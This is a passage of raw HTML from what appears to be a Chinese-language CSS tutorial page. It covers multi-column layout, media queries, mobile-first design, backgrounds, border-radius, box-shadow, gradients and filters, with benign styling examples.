class="hljs-attribute">grid-area</span>: sidebar; &#125;<br><span class="hljs-selector-class">.main</span> &#123; <span class="hljs-attribute">grid-area</span>: main; &#125;<br></code></pre></td></tr></table></figure><h3 id="兼容性"><a href="#兼容性" class="headerlink" title="兼容性"></a>兼容性</h3><ul><li>所有现代浏览器都支持</li><li>可以使用 <code>@supports</code> 检测<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@supports</span> (<span class="hljs-attribute">display</span>: <span class="hljs-attribute">grid</span>) &#123;<br>  <span class="hljs-selector-class">.item</span> &#123; <span class="hljs-attribute">grid-area</span>: main; &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-4-多列布局（column-count、column-gap）"><a href="#2-4-多列布局（column-count、column-gap）" class="headerlink" title="2.4 多列布局（column-count、column-gap）"></a>2.4 多列布局（column-count、column-gap）</h2><p>多列布局专为文本内容的分栏展示设计，适合新闻阅读、文档排版等场景</p><h3 id="核心属性"><a href="#核心属性" class="headerlink" title="核心属性"></a>核心属性</h3><p><strong>column-count - 分栏数量控制</strong></p><ul><li>作用：指定内容分为多少列</li><li>取值：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-count</span>: <span class="hljs-number">3</span>; <span class="hljs-comment">/* 固定3栏 */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>auto（默认）：由其他属性（如column-width）决定列数</li><li>整数：强制分栏数量（内容不足时会留空）</li></ul></li></ul><p><strong>column-gap - 栏间间距</strong></p><ul><li>作用：控制列与列之间的间隙</li><li>语法：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">2em</span>;    <span class="hljs-comment">/* 相对单位 */</span><br>  <span class="hljs-attribute">column-gap</span>: <span class="hljs-number">24px</span>;   <span class="hljs-comment">/* 固定像素 */</span><br>  <span class="hljs-attribute">column-gap</span>: normal; <span class="hljs-comment">/* 浏览器默认值（通常1em） */</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li>与Grid&#x2F;Flex的gap区别：多列布局的gap仅支持单值（不支持行列分别设置）</li></ul><h3 id="完整属性体系"><a href="#完整属性体系" class="headerlink" title="完整属性体系"></a>完整属性体系</h3><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">column-width</td><td align="left">每列理想宽度（实际可能调整）</td><td align="left">200px &#x2F; auto</td></tr><tr><td align="left">column-count</td><td align="left">最大分栏数</td><td align="left">3 &#x2F; auto</td></tr><tr><td align="left">column-gap</td><td align="left">栏间间距</td><td align="left">1em &#x2F; 20px</td></tr><tr><td align="left">column-rule</td><td align="left">栏间分隔线（类似border）</td><td align="left">1px solid #ddd</td></tr><tr><td align="left">column-fill</td><td align="left">内容填充方式</td><td align="left">auto &#x2F; balance</td></tr><tr><td align="left">column-span</td><td align="left">元素跨列（仅all&#x2F;none）</td><td align="left">all（标题跨所有列）</td></tr></tbody></table><h2 id="2-5-响应式布局（-media-查询、移动优先策略）"><a href="#2-5-响应式布局（-media-查询、移动优先策略）" class="headerlink" title="2.5 响应式布局（@media 查询、移动优先策略）"></a>2.5 响应式布局（@media 查询、移动优先策略）</h2><h3 id="响应式核心机制：-media-查询"><a href="#响应式核心机制：-media-查询" class="headerlink" title="响应式核心机制：@media 查询"></a>响应式核心机制：@media 查询</h3><p>作用：根据设备特性（宽度、分辨率、方向等）应用不同的CSS规则</p><p><strong>基础语法结构</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@media</span> [媒体类型] [<span class="hljs-keyword">and</span>] (媒体特征) &#123;<br>  <span class="hljs-comment">/* 条件满足时应用的CSS */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>关键媒体特征</strong></p><table><thead><tr><th align="left">特征</th><th align="left">应用场景</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">min-width &#x2F; max-width</td><td align="left">视口宽度断点</td><td align="left">(min-width: 768px)</td></tr><tr><td align="left">orientation</td><td align="left">设备方向</td><td align="left">(orientation: portrait)</td></tr><tr><td align="left">resolution</td><td align="left">屏幕分辨率</td><td align="left">(min-resolution: 2dppx)</td></tr><tr><td align="left">hover</td><td align="left">输入设备是否支持悬停</td><td align="left">(hover: hover)</td></tr><tr><td align="left">prefers-color-scheme</td><td align="left">系统深色模式</td><td align="left">(prefers-color-scheme: dark)</td></tr></tbody></table><p><strong>复合条件查询</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 平板横屏且最小宽度1024px */</span><br><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1024px</span>) <span class="hljs-keyword">and</span> (<span class="hljs-attribute">orientation</span>: landscape) &#123;<br>  <span class="hljs-selector-class">.sidebar</span> &#123; <span class="hljs-attribute">display</span>: block; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="移动优先（mobile-first）策略"><a href="#移动优先（mobile-first）策略" class="headerlink" title="移动优先（mobile-first）策略"></a>移动优先（mobile-first）策略</h3><p><strong>核心理念</strong></p><p>先为移动设备编写基础样式，再通过 <code>min-width</code> 逐步增强大屏体验</p><p><strong>代码实现范式</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 基础样式（移动端） */</span><br><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;<br>&#125;<br><br><span class="hljs-comment">/* 平板适配（≥768px） */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">768px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/* 桌面端适配（≥1200px） */</span><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1200px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1140px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第三章：CSS-视觉与动画"><a href="#第三章：CSS-视觉与动画" class="headerlink" title="第三章：CSS 视觉与动画"></a>第三章：CSS 视觉与动画</h1><h2 id="3-1-背景与边框（background、border-radius、box-shadow）"><a href="#3-1-背景与边框（background、border-radius、box-shadow）" class="headerlink" title="3.1 背景与边框（background、border-radius、box-shadow）"></a>3.1 背景与边框（background、border-radius、box-shadow）</h2><h3 id="背景-background-复合属性"><a href="#背景-background-复合属性" class="headerlink" title="背景 - background 复合属性"></a>背景 - background 复合属性</h3><p>现代 CSS 背景已发展为包含 8 个子属性的强大系统</p><p><strong>分层背景（支持多背景图）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">.<span class="hljs-property">hero</span> &#123;<br>  <span class="hljs-attr">background</span>: <br>    linear-<span class="hljs-title function_">gradient</span>(<span class="hljs-title function_">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.3</span>), transparent),<br>    <span class="hljs-title function_">url</span>(<span class="hljs-string">&#x27;hero-bg.jpg&#x27;</span>) center/cover no-repeat,<br>    #f5f5f5; <span class="hljs-comment">/* 兜底颜色 */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>层叠顺序：先声明的背景在上层</li></ul><p><strong>关键子属性详解</strong></p><table><thead><tr><th align="left">属性</th><th align="left">作用</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">background-image</td><td align="left">设置背景图像&#x2F;渐变</td><td align="left">url(‘img.png’), linear-gradient(to right, red, blue)</td></tr><tr><td align="left">background-size</td><td align="left">控制尺寸（需配合position）</td><td align="left">cover&#x2F;contain&#x2F;100px 50px</td></tr><tr><td align="left">background-position</td><td align="left">定位起始点</td><td align="left">center&#x2F;right</td></tr><tr><td align="left">background-repeat</td><td align="left">重复行为</td><td align="left">no-repeat&#x2F;space&#x2F;round</td></tr><tr><td align="left">background-origin</td><td align="left">定位基准（与border&#x2F;padding的关系）</td><td align="left">border-box&#x2F;content-box</td></tr><tr><td align="left">background-clip</td><td align="left">绘制区域</td><td align="left">text（文字镂空效果）</td></tr><tr><td align="left">background-attachment</td><td align="left">滚动行为</td><td align="left">fixed（视口固定背景）</td></tr><tr><td align="left">background-blend-mode</td><td align="left">混合模式</td><td align="left">multiply&#x2F;screen</td></tr></tbody></table><p><strong>性能优化技巧</strong></p><p>（1）雪碧图（sprite）自动化</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.icon</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;sprite.png&#x27;</span>) no-repeat;<br>  <span class="hljs-attribute">background-position</span>: -<span class="hljs-number">120px</span> -<span class="hljs-number">80px</span>; <span class="hljs-comment">/* 通过工具自动计算 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）WebP 格式优先</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.banner</span> &#123;<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;image.webp&#x27;</span>);<br>  <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">image-set</span>(<span class="hljs-string">&#x27;image.webp&#x27;</span> <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;image/webp&#x27;</span>), <span class="hljs-string">&#x27;image.jpg&#x27;</span> <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="border-radius-高级技巧"><a href="#border-radius-高级技巧" class="headerlink" title="border-radius 高级技巧"></a>border-radius 高级技巧</h3><p><strong>椭圆与复杂形状</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn</span> &#123;<br>  <span class="hljs-comment">/* 水平半径 / 垂直半径 */</span><br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span> <span class="hljs-number">20%</span> <span class="hljs-number">30%</span> <span class="hljs-number">40%</span> / <span class="hljs-number">60%</span> <span class="hljs-number">30%</span> <span class="hljs-number">70%</span> <span class="hljs-number">40%</span>; <br>&#125;<br></code></pre></td></tr></table></figure><ul><li>8值语法：分别控制四个角的x&#x2F;y轴半径</li></ul><p><strong>圆角头像</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.avatar</span> &#123;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;<br>  <span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">1</span>; <span class="hljs-comment">/* 确保宽高相等 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>胶囊按钮</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.pill-button</span> &#123;<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">9999px</span>; <span class="hljs-comment">/* 超大值实现 */</span><br>  <span class="hljs-comment">/* 或 */</span><br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">1em</span> + <span class="hljs-number">4px</span>); <span class="hljs-comment">/* 动态适应字体 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>隐藏陷阱</strong></p><ul><li>子元素溢出：父元素设置overflow: hidden</li><li>背景剪裁：配合background-clip: border-box</li></ul><h3 id="box-shadow-立体感打造"><a href="#box-shadow-立体感打造" class="headerlink" title="box-shadow 立体感打造"></a>box-shadow 立体感打造</h3><p>可叠加多层的阴影系统</p><p><strong>完整语法</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">box-shadow</span>: [inset] x-offset y-offset blur spread color;<br></code></pre></td></tr></table></figure><p>参数详解：</p><ul><li>inset：内阴影</li><li>spread：阴影扩展（正数放大&#x2F;负数收缩）</li><li>支持 RGBA 透明度控制</li></ul><p><strong>高级应用</strong></p><p>（1）多层阴影</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <br>    <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>),<br>    <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>); <span class="hljs-comment">/* 立体层次 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>（2）霓虹效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.neon</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-number">#0ff</span>, <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">20px</span> <span class="hljs-number">#0ff</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）边框替代方案（不占空间）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.border-alternative</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">#f00</span>; <span class="hljs-comment">/* 2px纯色外框 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="组合实战案例"><a href="#组合实战案例" class="headerlink" title="组合实战案例"></a>组合实战案例</h3><p>（1）玻璃拟态</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.glass</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>);<br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>);<br>  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.1</span>);<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">32px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>（2）文档卡片悬浮</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.doc-card</span> &#123;<br>  <span class="hljs-attribute">transition</span>: box-shadow <span class="hljs-number">0.2s</span>;<br>&#125;<br><span class="hljs-selector-class">.doc-card</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.15</span>);<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试问题-1"><a href="#高频面试问题-1" class="headerlink" title="高频面试问题"></a>高频面试问题</h3><p><strong>Q：如何实现 1px 细线边框</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.thin-border</span> &#123;<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0.5px</span> <span class="hljs-number">#000</span>; <span class="hljs-comment">/* 高清屏解决方案 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q：background-clip: text 的兼容性如何？</strong></p><ul><li>需配合-webkit-text-fill-color: transparent</li><li>备用方案：SVG文本背景</li></ul><h2 id="3-2-渐变与滤镜（linear-gradient、backdrop-filter）"><a href="#3-2-渐变与滤镜（linear-gradient、backdrop-filter）" class="headerlink" title="3.2 渐变与滤镜（linear-gradient、backdrop-filter）"></a>3.2 渐变与滤镜（linear-gradient、backdrop-filter）</h2><h3 id="CSS渐变-从基础到三维质感"><a href="#CSS渐变-从基础到三维质感" class="headerlink" title="CSS渐变 - 从基础到三维质感"></a>CSS渐变 - 从基础到三维质感</h3><p>CSS 渐变可替代图片实现高性能视觉效果</p><p><strong>linear-gradient 线性渐变</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>  [方向或角度], <br>  color-stop1, <br>  color-stop2, <br>  ...<br>);<br></code></pre></td></tr></table></figure><ul><li><p>方向控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 关键词 */</span><br><span class="hljs-selector-tag">to</span> <span class="hljs-attribute">right</span>, <span class="hljs-selector-tag">to</span> <span class="hljs-attribute">bottom</span> <span class="hljs-attribute">right</span><br><span class="hljs-comment">/* 角度 */</span><br><span class="hljs-number">45deg</span>, <span class="hljs-number">0.25turn</span><br></code></pre></td></tr></table></figure></li><li><p>色标高级控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>  to right,<br>  <span class="hljs-number">#ff0000</span> <span class="hljs-number">0%</span>,       <span class="hljs-comment">/* 纯红色起点 */</span><br>  <span class="hljs-number">#ff0000</span> <span class="hljs-number">20%</span>,      <span class="hljs-comment">/* 保持纯红到20% */</span><br>  <span class="hljs-number">#0000ff</span> <span class="hljs-number">80%</span>,      <span class="hljs-comment">/* 过渡到蓝色 */</span><br>  <span class="hljs-number">#0000ff</span> <span class="hljs-number">100%</span>      <span class="hljs-comment">/* 纯蓝色终点 */</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>案例：微信小程序按钮</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn-primary</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#07C160</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#09A855</span> <span class="hljs-number">100%</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>radial-gradient 径向渐变</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<br>  [形状 at 位置],<br>  color-stop1,<br>  color-stop2<br>);<br></code></pre></td></tr></table></figure><ul><li><p>形状控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-tag">circle</span> at center, <br><span class="hljs-selector-tag">ellipse</span> at <span class="hljs-number">20%</span> <span class="hljs-number">30%</span><br></code></pre></td></tr></table></figure></li><li><p>案例：logo 效果</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.logo</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">radial-gradient</span>(<br>    circle at <span class="hljs-number">30%</span> <span class="hljs-number">40%</span>,<br>    <span class="hljs-number">#ff0037</span> <span class="hljs-number">0%</span>,<br>    transparent <span class="hljs-number">60%</span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p><strong>conic-gradient 锥形渐变</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 饼图/色轮实现 */</span><br><span class="hljs-attribute">background</span>: <span class="hljs-built_in">conic-gradient</span>(<br>  red <span class="hljs-number">0deg</span> <span class="hljs-number">90deg</span>, <br>  green <span class="hljs-number">90deg</span> <span class="hljs-number">180deg</span>, <br>  blue <span class="hljs-number">180deg</span> <span class="hljs-number">270deg</span>, <br>  yellow <span class="hljs-number">270deg</span> <span class="hljs-number">360deg</span><br>);<br></code></pre></td></tr></table></figure><h3 id="CSS滤镜-视觉魔法"><a href="#CSS滤镜-视觉魔法" class="headerlink" title="CSS滤镜 - 视觉魔法"></a>CSS滤镜 - 视觉魔法</h3><p>滤镜可对元素本身或背景进行实时图像处理。</p><p><strong>filter 常用函数</strong></p><table><thead><tr><th align="left">滤镜函数</th><th align="left">效果</th><th align="left">示例值</th></tr></thead><tbody><tr><td align="left">blur()</td><td align="left">高斯模糊</td><td align="left">blur(5px)</td></tr><tr><td align="left">brightness()</td><td align="left">明暗度调整</td><td align="left">brightness(1.2)</td></tr><tr><td align="left">contrast()</td><td align="left">对比度调整</td><td align="left">contrast(150%)</td></tr><tr><td align="left">drop-shadow()</td><td align="left">投影（优于box-shadow）</td><td align="left">drop-shadow(2px 2px 4px #000)</td></tr><tr><td align="left">hue-rotate()</td><td align="left">色相旋转</td><td align="left">hue-rotate(90deg)</td></tr><tr><td align="left">grayscale()</td><td align="left">灰度化</td><td align="left">grayscale(100%)</td></tr></tbody></table><p>抖音风格特效：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.video-filter</span> &#123;<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">contrast</span>(<span class="hljs-number">1.2</span>) <span class="hljs-built_in">brightness</span>(<span class="hljs-number">1.1</span>) <span class="hljs-built_in">hue-rotate</span>(<span class="hljs-number">15deg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>backdrop-filter 背景滤镜</strong></p><p>仅处理元素背后的内容（需配合半透明背景）：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.modal</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.3</span>);<br>  <span class="hljs-attribute">backdrop-filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">10px</span>) <span class="hljs-built_in">saturate</span>(<span class="hljs-number">180%</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>适用场景：<ul><li>毛玻璃效果</li><li>弹窗背景虚化</li></ul></li><li>兼容性方案：<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-keyword">@supports</span> <span class="hljs-keyword">not</span> (<span class="hljs-attribute">backdrop-filter</span>: blur(<span class="hljs-number">10px</span>)) &#123;<br>  <span class="hljs-selector-class">.modal</span> &#123;<br>    <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">0.9</span>); <span class="hljs-comment">/* 降级处理 */</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h3 id="高级组合技巧"><a href="#高级组合技巧" class="headerlink" title="高级组合技巧"></a>高级组合技巧</h3><p><strong>渐变 + 滤镜实现 3D 按钮</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.btn-3d</span> &#123;<br>  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<br>    <span class="hljs-number">145deg</span>,<br>    <span class="hljs-number">#ffffff</span> <span class="hljs-number">0%</span>,<br>    <span class="hljs-number">#c8c8c8</span> <span class="hljs-number">50%</span>,<br>    <span class="hljs-number">#ffffff</span> <span class="hljs-number">100%</span><br>  );<br>  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">drop-shadow</span>(<span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.2</span>));<br>  &amp;<span 